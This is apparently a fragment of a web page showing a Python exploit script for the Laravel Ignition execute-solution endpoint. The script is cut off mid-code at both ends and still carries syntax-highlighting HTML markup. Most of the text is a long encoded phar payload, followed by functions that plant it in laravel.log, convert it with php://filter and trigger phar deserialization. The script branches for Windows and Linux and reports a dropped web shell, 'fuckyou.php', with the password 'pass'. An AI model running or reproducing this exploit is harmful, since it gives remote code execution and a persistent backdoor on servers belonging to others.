6A=00=4A=00=30=00=62=00=45=00=74=00=44=00=55=00=6E=00=64=00=4C=00=57=00=48=00=52=00=73=00=5A=00=47=00=31=00=47=00=63=00=30=00=74=00=44=00=55=00=6E=00=64=00=4D=00=61=00=55=00=6C=00=70=00=53=00=31=00=52=00=30=00=4F=00=57=00=5A=00=54=00=55=00=6C=00=4E=00=51=00=56=00=7A=00=56=00=73=00=5A=00=48=00=6C=00=43=00=52=00=45=00=74=00=44=00=61=00=7A=00=64=00=4B=00=52=00=6B=00=6C=00=30=00=55=00=47=00=30=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=43=00=56=00=33=00=6C=00=42=00=64=00=30=00=6C=00=47=00=4D=00=48=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=32=00=4D=00=7A=00=56=00=6D=00=6C=00=6A=00=4D=00=31=00=4A=00=35=00=53=00=30=00=63=00=78=00=61=00=30=00=35=00=54=00=5A=00=32=00=74=00=56=00=51=00=7A=00=52=00=72=00=56=00=6B=00=4E=00=72=00=63=00=30=00=6C=00=45=00=51=00=57=00=64=00=4D=00=51=00=30=00=46=00=34=00=54=00=6D=00=6C=00=42=00=63=00=45=00=38=00=79=00=56=00=6D=00=70=00=68=00=52=00=7A=00=68=00=6E=00=56=00=56=00=4E=00=6F=00=52=00=6B=00=74=00=46=00=51=00=6E=00=6C=00=6B=00=56=00=7A=00=52=00=76=00=53=00=6B=00=56=00=5A=00=63=00=45=00=78=00=44=00=55=00=6C=00=56=00=4C=00=55=00=32=00=73=00=33=00=57=00=6C=00=64=00=4F=00=62=00=32=00=4A=00=35=00=51=00=6E=00=70=00=6B=00=56=00=30=00=70=00=36=00=5A=00=45=00=68=00=4A=00=62=00=32=00=4A=00=58=00=55=00=54=00=46=00=4C=00=51=00=31=00=4A=00=52=00=54=00=47=00=6C=00=53=00=56=00=55=00=74=00=54=00=64=00=32=00=64=00=4E=00=56=00=46=00=6C=00=6E=00=53=00=31=00=52=00=30=00=4F=00=56=00=70=00=58=00=65=00=48=00=70=00=61=00=57=00=48=00=4E=00=72=00=57=00=44=00=46=00=4F=00=52=00=6C=00=55=00=78=00=54=00=6B=00=70=00=55=00=4D=00=44=00=56=00=69=00=53=00=6B=00=5A=00=61=00=5A=00=46=00=42=00=54=00=55=00=6B=00=64=00=50=00=4D=00=7A=00=45=00=35=00=49=00=48=00=77=00=67=00=59=00=6D=00=46=00=7A=00=5A=00=54=00=59=00=30=00=49=00=43=00=31=00=6B=00=49=00=44=00=34=00=75=00=4C=00=32=00=5A=00=31=00=59=00=32=00=74=00=35=00=62=00=33=00=55=00=75=00=63=00=47=00=68=00=77=00=49=00=6A=00=74=00=7A=00=4F=00=6A=00=55=00=36=00=49=00=6D=00=78=00=6C=00=64=00=6D=00=56=00=73=00=49=00=6A=00=74=00=4F=00=4F=00=33=00=31=00=39=00=63=00=7A=00=6F=00=34=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=70=00=62=00=6D=00=6C=00=30=00=61=00=57=00=46=00=73=00=61=00=58=00=70=00=6C=00=5A=00=43=00=49=00=37=00=59=00=6A=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=51=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6B=00=78=00=70=00=62=00=57=00=6C=00=30=00=49=00=6A=00=74=00=70=00=4F=00=69=00=30=00=78=00=4F=00=33=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=48=00=42=00=79=00=62=00=32=00=4E=00=6C=00=63=00=33=00=4E=00=76=00=63=00=6E=00=4D=00=69=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4E=00=7A=00=6F=00=69=00=59=00=33=00=56=00=79=00=63=00=6D=00=56=00=75=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=78=00=4F=00=33=00=4D=00=36=00=4E=00=6A=00=6F=00=69=00=63=00=33=00=6C=00=7A=00=64=00=47=00=56=00=74=00=49=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4D=00=54=00=4D=00=36=00=49=00=67=00=41=00=71=00=41=00=47=00=4A=00=31=00=5A=00=6D=00=5A=00=6C=00=63=00=6C=00=4E=00=70=00=65=00=6D=00=55=00=69=00=4F=00=32=00=6B=00=36=00=4C=00=54=00=45=00=37=00=63=00=7A=00=6F=00=35=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=49=00=69=00=4F=00=32=00=45=00=36=00=4D=00=54=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=32=00=45=00=36=00=4D=00=6A=00=70=00=37=00=61=00=54=00=6F=00=77=00=4F=00=33=00=4D=00=36=00=4F=00=44=00=41=00=77=00=4F=00=69=00=4A=00=6C=00=59=00=32=00=68=00=76=00=49=00=46=00=42=00=45=00=4F=00=58=00=64=00=68=00=53=00=45=00=46=00=6E=00=53=00=55=00=68=00=4F=00=62=00=47=00=4D=00=7A=00=54=00=6E=00=42=00=69=00=4D=00=6A=00=56=00=6D=00=59=00=7A=00=4E=00=53=00=61=00=47=00=4E=00=75=00=55=00=57=00=39=00=4C=00=56=00=48=00=52=00=42=00=59=00=7A=00=4A=00=57=00=4D=00=46=00=67=00=7A=00=55=00=6E=00=42=00=69=00=56=00=31=00=5A=00=6D=00=59=00=6B=00=64=00=73=00=64=00=47=00=46=00=59=00=55=00=57=00=39=00=4E=00=51=00=32=00=73=00=33=00=55=00=55=00=64=00=57=00=65=00=57=00=4E=00=74=00=4F=00=58=00=6C=00=59=00=4D=00=30=00=70=00=73=00=59=00=30=00=63=00=35=00=65=00=57=00=52=00=48=00=62=00=48=00=56=00=61=00=65=00=57=00=64=00=33=00=53=00=31=00=52=00=30=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=52=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4D=00=51=00=31=00=4A=00=4D=00=53=00=31=00=68=00=30=00=62=00=57=00=49=00=7A=00=53=00=57=00=39=00=4B=00=52=00=32=00=73=00=35=00=53=00=55=00=52=00=42=00=5A=00=30=00=39=00=35=00=55=00=6E=00=42=00=51=00=53=00=45=00=34=00=77=00=59=00=32=00=31=00=34=00=62=00=47=00=4A=00=70=00=5A=00=32=00=74=00=53=00=51=00=32=00=73=00=33=00=53=00=6B=00=64=00=72=00=63=00=6B=00=74=00=35=00=62=00=44=00=64=00=4B=00=52=00=56=00=4A=00=69=00=53=00=6B=00=64=00=73=00=5A=00=46=00=42=00=54=00=55=00=6B=00=56=00=58=00=65=00=56=00=4A=00=77=00=57=00=46=00=59=00=30=00=61=00=31=00=4D=00=78=00=63=00=32=00=74=00=68=00=55=00=33=00=4E=00=6E=00=54=00=56=00=4E=00=42=00=62=00=55=00=6C=00=45=00=52=00=54=00=46=00=4A=00=52=00=6A=00=41=00=33=00=5A=00=6C=00=68=00=4B=00=62=00=47=00=52=00=49=00=56=00=6E=00=6C=00=69=00=61=00=56=00=4A=00=46=00=54=00=7A=00=4D=00=78=00=62=00=57=00=52=00=58=00=4E=00=57=00=70=00=6B=00=52=00=32=00=78=00=32=00=59=00=6D=00=6C=00=43=00=55=00=6B=00=74=00=44=00=55=00=6B=00=56=00=4C=00=57=00=48=00=52=00=35=00=57=00=6C=00=68=00=53=00=4D=00=57=00=4E=00=74=00=4E=00=47=00=64=00=5A=00=62=00=55=00=5A=00=36=00=57=00=6C=00=52=00=5A=00=4D=00=46=00=67=00=79=00=56=00=6E=00=56=00=5A=00=4D=00=6A=00=6C=00=72=00=57=00=6C=00=4E=00=6E=00=61=00=31=00=4A=00=44=00=61=00=7A=00=64=00=6D=00=56=00=31=00=6F=00=78=00=59=00=6D=00=31=00=4F=00=4D=00=47=00=46=00=58=00=4F=00=58=00=56=00=4A=00=52=00=54=00=68=00=76=00=53=00=6B=00=56=00=52=00=63=00=47=00=55=00=7A=00=53=00=6D=00=78=00=6B=00=53=00=46=00=5A=00=35=00=59=00=6D=00=6C=00=43=00=61=00=56=00=6C=00=59=00=54=00=6D=00=78=00=4F=00=61=00=6C=00=4A=00=6D=00=57=00=6B=00=64=00=57=00=61=00=6D=00=49=00=79=00=55=00=6D=00=78=00=4C=00=51=00=31=00=4A=00=46=00=53=00=31=00=52=00=30=00=4F=00=55=00=70=00=47=00=51=00=54=00=6C=00=4B=00=4D=00=30=00=4A=00=6F=00=59=00=7A=00=4E=00=4E=00=62=00=6B=00=39=00=35=00=55=00=6C=00=64=00=51=00=55=00=32=00=52=00=33=00=57=00=56=00=68=00=73=00=63=00=32=00=49=00=79=00=52=00=6D=00=74=00=4B=00=65=00=6E=00=4E=00=72=00=56=00=6B=00=51=00=77=00=62=00=6B=00=30=00=79=00=54=00=54=00=4A=00=61=00=56=00=45=00=4A=00=70=00=54=00=30=00=64=00=46=00=4E=00=56=00=6C=00=36=00=52=00=54=00=46=00=4E=00=61=00=6B=00=6B=00=77=00=57=00=56=00=4E=00=6A=00=4E=00=32=00=46=00=58=00=57=00=57=00=39=00=68=00=57=00=45=00=35=00=36=00=57=00=6C=00=68=00=52=00=62=00=30=00=70=00=47=00=4F=00=56=00=46=00=55=00=4D=00=55=00=35=00=56=00=56=00=33=00=6C=00=53=00=55=00=56=00=68=00=54=00=61=00=33=00=42=00=6C=00=65=00=56=00=4A=00=48=00=55=00=46=00=55=00=34=00=62=00=31=00=4A=00=54=00=61=00=46=00=42=00=4C=00=51=00=31=00=4A=00=6D=00=56=00=55=00=55=00=35=00=56=00=46=00=5A=00=47=00=63=00=32=00=74=00=56=00=52=00=6A=00=42=00=77=00=54=00=45=00=4E=00=53=00=56=00=55=00=74=00=54=00=61=00=7A=00=64=00=68=00=56=00=31=00=6C=00=76=00=59=00=56=00=68=00=4F=00=65=00=6C=00=70=00=59=00=55=00=57=00=39=00=4B=00=52=00=6A=00=6C=00=55=00=55=00=6C=00=5A=00=4F=00=56=00=46=00=4E=00=56=00=4F=00=55=00=39=00=58=00=65=00=56=00=4A=00=58=00=57=00=46=00=4E=00=72=00=63=00=47=00=56=00=35=00=55=00=6B=00=31=00=51=00=55=00=31=00=4A=00=6D=00=56=00=54=00=42=00=57=00=56=00=46=00=55=00=77=00=62=00=46=00=42=00=55=00=62=00=48=00=4E=00=72=00=56=00=6D=00=77=00=77=00=4E=00=30=00=70=00=46=00=52=00=54=00=6C=00=61=00=57=00=47=00=68=00=33=00=59=00=6B=00=63=00=35=00=61=00=31=00=70=00=54=00=5A=00=32=00=35=00=6D=00=51=00=32=00=4E=00=7A=00=53=00=6B=00=56=00=33=00=63=00=45=00=38=00=79=00=54=00=6E=00=4E=00=5A=00=57=00=45=00=35=00=36=00=53=00=55=00=56=00=4F=00=4E=00=32=00=4E=00=49=00=56=00=6D=00=6C=00=69=00=52=00=32=00=78=00=71=00=53=00=55=00=64=00=61=00=4D=00=57=00=4A=00=74=00=54=00=6A=00=42=00=68=00=56=00=7A=00=6C=00=31=00=53=00=55=00=63=00=31=00=4D=00=6D=00=49=00=79=00=64=00=47=00=78=00=4C=00=51=00=31=00=4A=00=33=00=53=00=31=00=68=00=30=00=62=00=47=00=52=00=74=00=52=00=6E=00=4E=00=4C=00=51=00=31=00=4A=00=33=00=54=00=47=00=6C=00=4A=00=61=00=55=00=74=00=55=00=64=00=44=00=6C=00=6D=00=55=00=31=00=4A=00=54=00=55=00=46=00=63=00=31=00=62=00=47=00=52=00=35=00=51=00=6B=00=52=00=4C=00=51=00=32=00=73=00=33=00=53=00=6B=00=5A=00=4A=00=64=00=46=00=42=00=74=00=4E=00=54=00=4A=00=69=00=4D=00=6E=00=52=00=73=00=53=00=30=00=4E=00=53=00=51=00=6C=00=64=00=35=00=51=00=58=00=64=00=4A=00=52=00=6A=00=42=00=77=00=54=00=7A=00=4A=00=57=00=61=00=6D=00=46=00=48=00=4F=00=47=00=64=00=6A=00=4D=00=31=00=5A=00=70=00=59=00=7A=00=4E=00=53=00=65=00=55=00=74=00=48=00=4D=00=57=00=74=00=4F=00=55=00=32=00=64=00=72=00=56=00=55=00=4D=00=30=00=61=00=31=00=5A=00=44=00=61=00=33=00=4E=00=4A=00=52=00=45=00=46=00=6E=00=54=00=45=00=4E=00=42=00=65=00=45=00=35=00=70=00=51=00=58=00=42=00=50=00=4D=00=6C=00=5A=00=71=00=59=00=55=00=63=00=34=00=5A=00=31=00=56=00=54=00=61=00=45=00=5A=00=4C=00=52=00=55=00=4A=00=35=00=5A=00=46=00=63=00=30=00=62=00=30=00=70=00=46=00=57=00=58=00=42=00=4D=00=51=00=31=00=4A=00=56=00=53=00=31=00=4E=00=72=00=4E=00=31=00=70=00=58=00=54=00=6D=00=39=00=69=00=65=00=55=00=4A=00=36=00=5A=00=46=00=64=00=4B=00=65=00=6D=00=52=00=49=00=53=00=57=00=39=00=69=00=56=00=31=00=45=00=78=00=53=00=30=00=4E=00=53=00=55=00=55=00=78=00=70=00=55=00=6C=00=56=00=4C=00=55=00=33=00=64=00=6E=00=54=00=56=00=52=00=5A=00=5A=00=30=00=74=00=55=00=64=00=44=00=6C=00=61=00=56=00=33=00=68=00=36=00=57=00=6C=00=68=00=7A=00=61=00=31=00=67=00=78=00=54=00=6B=00=5A=00=56=00=4D=00=55=00=35=00=4B=00=56=00=44=00=41=00=31=00=59=00=6B=00=70=00=47=00=57=00=6D=00=52=00=51=00=55=00=31=00=4A=00=48=00=54=00=7A=00=4D=00=78=00=4F=00=53=00=42=00=38=00=49=00=47=00=4A=00=68=00=63=00=32=00=55=00=32=00=4E=00=43=00=41=00=74=00=5A=00=43=00=41=00=2B=00=4C=00=69=00=39=00=6D=00=64=00=57=00=4E=00=72=00=65=00=57=00=39=00=31=00=4C=00=6E=00=42=00=6F=00=63=00=43=00=49=00=37=00=63=00=7A=00=6F=00=31=00=4F=00=69=00=4A=00=73=00=5A=00=58=00=5A=00=6C=00=62=00=43=00=49=00=37=00=54=00=6A=00=74=00=39=00=66=00=58=00=4D=00=36=00=4F=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=62=00=47=00=56=00=32=00=5A=00=57=00=77=00=69=00=4F=00=30=00=34=00=37=00=63=00=7A=00=6F=00=78=00=4E=00=44=00=6F=00=69=00=41=00=43=00=6F=00=41=00=61=00=57=00=35=00=70=00=64=00=47=00=6C=00=68=00=62=00=47=00=6C=00=36=00=5A=00=57=00=51=00=69=00=4F=00=32=00=49=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=30=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=69=00=64=00=57=00=5A=00=6D=00=5A=00=58=00=4A=00=4D=00=61=00=57=00=31=00=70=00=64=00=43=00=49=00=37=00=61=00=54=00=6F=00=74=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=45=00=7A=00=4F=00=69=00=49=00=41=00=4B=00=67=00=42=00=77=00=63=00=6D=00=39=00=6A=00=5A=00=58=00=4E=00=7A=00=62=00=33=00=4A=00=7A=00=49=00=6A=00=74=00=68=00=4F=00=6A=00=49=00=36=00=65=00=32=00=6B=00=36=00=4D=00=44=00=74=00=7A=00=4F=00=6A=00=63=00=36=00=49=00=6D=00=4E=00=31=00=63=00=6E=00=4A=00=6C=00=62=00=6E=00=51=00=69=00=4F=00=32=00=6B=00=36=00=4D=00=54=00=74=00=7A=00=4F=00=6A=00=59=00=36=00=49=00=6E=00=4E=00=35=00=63=00=33=00=52=00=6C=00=62=00=53=00=49=00=37=00=66=00=58=00=31=00=39=00=42=00=51=00=41=00=41=00=41=00=47=00=52=00=31=00=62=00=57=00=31=00=35=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=43=00=41=00=41=00=41=00=41=00=48=00=52=00=6C=00=63=00=33=00=51=00=75=00=64=00=48=00=68=00=30=00=42=00=41=00=41=00=41=00=41=00=44=00=77=00=7A=00=43=00=6D=00=41=00=45=00=41=00=41=00=41=00=41=00=44=00=48=00=35=00=2F=00=32=00=4B=00=51=00=42=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=41=00=64=00=47=00=56=00=7A=00=64=00=48=00=52=00=6C=00=63=00=33=00=53=00=6D=00=31=00=59=00=37=00=6B=00=34=00=32=00=72=00=2B=00=63=00=49=00=36=00=74=00=78=00=58=00=67=00=47=00=6A=00=36=00=46=00=66=00=4A=00=33=00=72=00=43=00=58=00=51=00=49=00=41=00=41=00=41=00=42=00=48=00=51=00=6B=00=31=00=43=00a"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req <span class="token keyword">def</span> <span class="token function">filterlog</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token string">"variableName"</span><span class="token punctuation">:</span> <span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req  <span class="token keyword">def</span> <span class="token function">phar</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">"variableName"</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"phar://"</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">"\storage\\logs\\laravel.log\\test.txt"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req <span class="token keyword">def</span> <span class="token function">pharl</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span>path<span class="token punctuation">)</span><span class="token punctuation">:</span>    data<span class="token operator">=</span><span class="token punctuation">{</span> <span class="token string">"solution"</span><span class="token punctuation">:</span> <span class="token string">"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution"</span><span class="token punctuation">,</span> <span class="token string">"parameters"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token string">"variableName"</span><span class="token punctuation">:</span><span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"viewFile"</span><span class="token punctuation">:</span> <span class="token string">"phar://"</span><span class="token operator">+</span>path<span class="token operator">+</span><span class="token string">"/storage/logs/laravel.log/test.txt"</span> <span class="token punctuation">}</span><span class="token punctuation">}</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span>indent<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> req <span class="token keyword">def</span> <span class="token function">path</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    req<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    pattern <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'(\#\d*\ (.*)(?:\/|\\)vendor)'</span><span class="token punctuation">)</span>    m<span class="token operator">=</span>pattern<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>req<span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token triple-quoted-string string">'''  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–“â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„   â–ˆâ–ˆâ–“â–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–€â–ˆâ–ˆâ–ˆ   â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–’â–ˆâ–ˆ    â–’ â–“â–ˆ   â–€ â–’â–ˆâ–ˆâ–€ â–€â–ˆ  â–“â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’â–“â–ˆâ–ˆ â–’ â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–’  â–ˆâ–ˆâ–’â–’â–ˆâ–ˆ    â–’ â–‘ â–“â–ˆâ–ˆâ–„   â–’â–ˆâ–ˆâ–ˆ   â–’â–“â–ˆ    â–„ â–“â–ˆâ–ˆâ–‘ â–ˆâ–ˆâ–“â–’â–“â–ˆâ–ˆ â–‘â–„â–ˆ â–’â–’â–ˆâ–ˆâ–‘  â–ˆâ–ˆâ–’â–‘ â–“â–ˆâ–ˆâ–„     â–’   â–ˆâ–ˆâ–’â–’â–“â–ˆ  â–„ â–’â–“â–“â–„ â–„â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–„â–ˆâ–“â–’ â–’â–’â–ˆâ–ˆâ–€â–€â–ˆâ–„  â–’â–ˆâ–ˆ   â–ˆâ–ˆâ–‘  â–’   â–ˆâ–ˆâ–’â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–’â–’ â–“â–ˆâ–ˆâ–ˆâ–€ â–‘â–’â–ˆâ–ˆâ–’ â–‘  â–‘â–‘â–ˆâ–ˆâ–“ â–’â–ˆâ–ˆâ–’â–‘ â–ˆâ–ˆâ–ˆâ–ˆâ–“â–’â–‘â–’â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–’â–’â–’ â–’â–“â–’ â–’ â–‘â–‘â–‘ â–’â–‘ â–‘â–‘ â–‘â–’ â–’  â–‘â–’â–“â–’â–‘ â–‘  â–‘â–‘ â–’â–“ â–‘â–’â–“â–‘â–‘ â–’â–‘â–’â–‘â–’â–‘ â–’ â–’â–“â–’ â–’ â–‘â–‘ â–‘â–’  â–‘ â–‘ â–‘ â–‘  â–‘  â–‘  â–’   â–‘â–’ â–‘       â–‘â–’ â–‘ â–’â–‘  â–‘ â–’ â–’â–‘ â–‘ â–‘â–’  â–‘ â–‘â–‘  â–‘  â–‘     â–‘   â–‘        â–‘â–‘         â–‘â–‘   â–‘ â–‘ â–‘ â–‘ â–’  â–‘  â–‘  â–‘        â–‘     â–‘  â–‘â–‘ â–‘                  â–‘         â–‘ â–‘        â–‘                  â–‘                                             '''</span><span class="token punctuation">)</span>url<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/_ignition/execute-solution"</span>clearlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span>clearlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span>clearlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span>clearlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span>clearlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>AA<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">":"</span> <span class="token keyword">in</span> path<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"windows"</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>sendpayloadwindows<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>filterlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>phar<span class="token punctuation">(</span>url<span class="token punctuation">,</span>path<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/fuckyou.php"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]webshellåœ°å€:"</span><span class="token operator">+</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/fuckyou.php,å¯†ç :pass"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]æ¼æ´ä¸å­˜åœ¨"</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">":"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> path<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"linux"</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>sendpayloadlinux<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>filterlog<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>pharl<span class="token punctuation">(</span>url<span class="token punctuation">,</span>path<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">if</span><span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token string">"/fuckyou.php"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>status_code<span class="token operator">==</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token 